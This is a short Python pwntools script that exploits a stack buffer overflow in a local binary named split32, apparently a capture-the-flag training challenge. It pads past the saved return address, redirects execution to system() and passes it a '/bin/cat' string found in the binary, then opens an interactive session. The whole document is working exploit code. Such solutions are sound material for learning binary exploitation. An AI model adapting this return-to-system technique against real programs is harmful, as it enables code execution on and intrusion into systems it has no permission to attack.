from pwn import *

sh = process('./split32')
elf = ELF('./split32')

system_addr = elf.symbols['system']
shell_addr = elf.search('/bin/cat').next()

payload = 'a' * (0x28 + 0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(shell_addr)

sh.recvuntil('>')
sh.send(payload)

sh.interactive()
sh.close()